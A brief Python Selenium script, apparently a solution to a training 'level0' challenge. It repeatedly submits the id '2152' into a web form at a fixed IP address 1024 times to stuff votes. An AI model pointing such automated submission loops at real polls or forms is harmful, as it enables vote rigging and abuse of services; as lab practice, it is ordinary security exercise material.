#!/usr/bin/python3
import time
from secretstorage import item
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import csv
import os
cwd = os.getcwd()
path = cwd + "/chromedriver"
DRIVER_PATH = path
options = Options()
options.headless = False
options.add_argument("--window-size=1400,900")
driver = webdriver.Chrome(options=options, executable_path=DRIVER_PATH)
Url = "http://158.69.76.135/level0.php"
driver.get(Url)
for x in range(0, 1024):
    input_v = driver.find_element_by_name("id")
    input_v.send_keys("2152")
    input_v.send_keys(Keys.RETURN)
    time.sleep(1)
driver.quit()
